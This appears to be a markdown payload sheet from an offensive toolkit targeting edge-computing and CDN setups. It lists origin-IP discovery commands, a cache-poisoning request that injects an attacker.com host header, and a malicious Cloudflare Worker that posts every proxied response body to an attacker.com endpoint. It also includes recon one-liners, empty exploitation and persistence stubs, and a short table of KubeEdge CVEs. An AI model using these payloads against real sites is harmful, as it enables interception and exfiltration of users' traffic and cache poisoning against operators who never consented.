# Payloads — edge-computing-security

> Attack payloads for edge-computing-security.

## Origin IP Discovery

### DNS History (SecurityTrails)

```bash
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" -H "APIKEY: YOUR_KEY"
```

### SSL Certificate SAN

```bash
# Search for certs matching target domain
curl "https://crt.sh/?q=target.com"
# Find IPs hosting those certs
```

## Cache Poisoning

### Unkeyed Header Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Server may cache response with attacker.com link.

## Cloudflare Workers Abuse

### Malicious Worker

```javascript
addEventListener('fetch', event => {
  event.respondWith(fetch(event.request).then(response => {
    // Exfiltrate response to attacker
    fetch('https://attacker.com/log', {method: 'POST', body: response.clone().body});
    return response;
  }));
});
```


---

## Additional Payloads

### Reconnaissance

```bash
# Fingerprint target
nmap -sV target.com
whatweb target.com
```

### Exploitation

```bash
# Various exploitation payloads
# (See kali-claw for full library)
```

### Persistence

```bash
# Persistence techniques
# (Depends on specific target)
```

---

### Known Edge Computing CVEs (NVD-verified, v0.3.2)

All IDs verified against the NVD API on 2026-09-07 before inclusion.

| CVE | Product | CVSS | Summary (from NVD record) |
|-----|---------|------|----------------------------|
| CVE-2022-31074 | linuxfoundation/kubeedge | 6.5 | KubeEdge is an open source system for extending native containerized application orchestration capabilities t… |
| CVE-2022-31075 | linuxfoundation/kubeedge | 6.5 | KubeEdge is an open source system for extending native containerized application orchestration capabilities t… |
| CVE-2022-31077 | linuxfoundation/kubeedge | 5.7 | KubeEdge is built upon Kubernetes and extends native containerized application orchestration and device manag… |
